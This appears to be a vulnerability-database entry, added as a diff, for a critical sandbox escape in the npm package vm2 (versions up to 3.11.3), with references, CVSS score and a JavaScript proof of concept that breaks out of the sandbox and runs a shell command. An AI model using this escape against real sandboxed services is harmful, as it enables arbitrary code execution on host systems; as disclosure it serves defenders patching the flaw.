@@ -1,0 +1,56 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-05-29T17:33:58Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "vm2"
+  },
+  "Advisory": {
+    "DatabaseId": 359349,
+    "Id": "GSA_kwCzR0hTQS12Nm14LW1mNDctcjV3Z84ABXu1",
+    "GhsaId": "GHSA-v6mx-mf47-r5wg",
+    "References": [
+      {
+        "Url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-v6mx-mf47-r5wg"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/commit/27c525f4615e2b983f122e2bed327d810126f5c8"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/releases/tag/v3.11.4"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-v6mx-mf47-r5wg"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-v6mx-mf47-r5wg"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-47131"
+      }
+    ],
+    "Description": "### Summary\nBy combining `Buffer.call.call({}.__lookupGetter__, Buffer, \"__proto__\")`, `Buffer.call.call({}.__lookupSetter__, Buffer, \"__proto__\")`, and Node.js's `ERR_INVALID_ARG_TYPE` Error, the host's `TypeError` constructor can be obtained, which allows the escape from the sandbox.\nThis allows attackers to run arbitrary code.\n\n### PoC\n```js\n\"use strict\";\n\nconst { VM } = require(\"vm2\");\nconst vm = new VM();\n\nvm.run(`\n  \"use strict\";\n\n  const getProto = Buffer.call.call({}.__lookupGetter__, Buffer, \"__proto__\");\n  const setProto = Buffer.call.call({}.__lookupSetter__, Buffer, \"__proto__\");\n\n  async function f() {\n    try {\n      await WebAssembly.compileStreaming();\n    } catch(e) {\n      setProto.call(getProto.call(e), null);\n    }\n\n    try {\n      await WebAssembly.compileStreaming();\n    } catch(e) {\n      const HostFunction = e.constructor.constructor;\n      new HostFunction(\"return process\")().mainModule.require(\"child_process\").execSync(\"echo pwned\", { stdio: \"inherit\" });\n    }\n  }\n\n  f();\n`);\n```\n\n### Impact\nSandbox Escape → RCE",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-29T17:33:58Z",
+    "Severity": "CRITICAL",
+    "Summary": "vm2 has a Sandbox Escape issue",
+    "UpdatedAt": "2026-05-29T17:33:58Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 10,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.11.4"
+      },
+      "VulnerableVersionRange": "\u003c= 3.11.3"
+    }
+  ]
+}
